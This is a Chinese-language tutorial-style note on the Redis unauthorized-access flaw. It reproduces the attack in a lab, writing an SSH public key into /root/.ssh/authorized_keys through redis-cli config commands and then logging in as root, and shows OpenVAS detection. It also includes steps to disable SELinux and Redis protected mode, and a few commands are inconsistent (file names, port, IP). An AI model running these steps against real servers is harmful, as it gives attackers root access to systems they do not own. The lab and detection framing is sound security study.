---
title: redis未授权访问漏洞
tags: redis,未授权访问
grammar_cjkRuby: true
---
## redis是什么
redis是一个高性能的key-value数据库,开源,遵守BSD协议。
### BSD协议
BSD开源协议是一个给于使用者很大自由的协议。可以自由的使用，修改源代码，也可以将修改后的代码作为开源或者专有软件再发布。
### redis特点
* Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的  时候可以再次加载进行使用。
* Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。
* Redis支持数据的备份，即master-slave模式的数据备份。
BSD协议
## redis未授权访问漏洞
### 漏洞的影响
攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。
### 漏洞产生的原因
Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。
### 公钥登陆
用户将自己的SSH公钥储存在远程主机上。登录的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来。远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，允许直接登录shell，不再要求密码。
![enter description here][1]
### 总结
即只要向目标机器~/.ssh/authorized_keys的文件写入自己的公钥，就可以直接登陆目标机器的shell。
## 渗透场景

## 漏洞的重现和利用
### 漏洞环境搭建
1. 安装和启动redis服务
在win10下的虚拟机fedora26
安装redis时默认会将redis绑定在0.0.0.0：6397
```shell
$ yum install redis*
$ redis-server
```
2.安装ssh
linux中默认自带ssh
需要启动ssh
```shell
$ service sshd start
```
3.配置ssh
在.ssh目录下，获得公钥和私钥，将公钥前后加入两空行写入pub.txt文件中.
最后将pub.txt的内容连接到目标机器redis服务中键名为crackit的键值中，假设目标机器ip为：192.168.1.1 
```shell
$ cd /root/.ssh
$ ssh-keygen –t rsa
$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > pub.txt
$ cat foo.txt | redis-cli -h 192.168.1.1 -x set crackit
```
### 漏洞复现
连接reids服务
就跟redis的数据库文件保存路径
将前面保存的键值crackit加入”authorized_keys“末尾
```shell
$ redis-cli -h 192.168.1.11
$ config set dir /root/.ssh/
查看是否修改成功
$ config get dir
$ config set dbfilename "authorized_keys"
获取当前数据库文件
$ config get dbfilename
$ save
```
配置完后，就可以直接使用自己的私钥连接目标机器了

```shell
$ ssh –i id_rsa root@192.168.1.1
```
## 使用openvas验证
![enter description here][2]
漏洞名称为Redis Server no password
![enter description here][3]
根据openvas
漏洞产生的原因：是因为没有使用密码对Redis进行保护
检查漏洞的方法：连接远程的redis服务器查看它是否存在密码
### 查看扫描脚本nvt
NVT:Network Vulnerability Test网络漏洞测试
一个网络漏洞测试程序，用于检查目标系统是否存在一个特定的已知或潜在安全问题。
NVT在目录/var/lib/openvas/plugins/
根据扫描结果中的OID值可以在中找到NVT文件位置http://www.openvas.org/openvas-nvt-feed.html
![enter description here][4]
![enter description here][5]
脚本扫描原理获取redis使用端口号，查看redis是否具有密码如果redis没有密码则存在相关漏洞
## 注意
1.需要关闭SElinux
修改/etc/selinux/config 文件
将SELINUX=enforcing改为SELINUX=disabled
重启
2.redis默认开启了protected mode
在将公钥存在redis键中时会拒绝操作
使用提示中给出的临时改变配置的方法redis-server --proteced-mode no的方法关闭该模式。
3.只能获取到启动redis-server的用户权限
即如果是普通用户启动redis服务可能，入侵者就没有办法权限修改authorized_keys文件
  [1]: ./images/%E5%9B%BE%E7%89%871.png "图片1"
  [2]: ./images/%E5%9B%BE%E7%89%871_1.png "图片1"
  [3]: ./images/%E5%9B%BE%E7%89%872.png "图片2"
  [4]: ./images/%E5%9B%BE%E7%89%873.png "图片3"
  [5]: ./images/%E5%9B%BE%E7%89%874.png "图片4"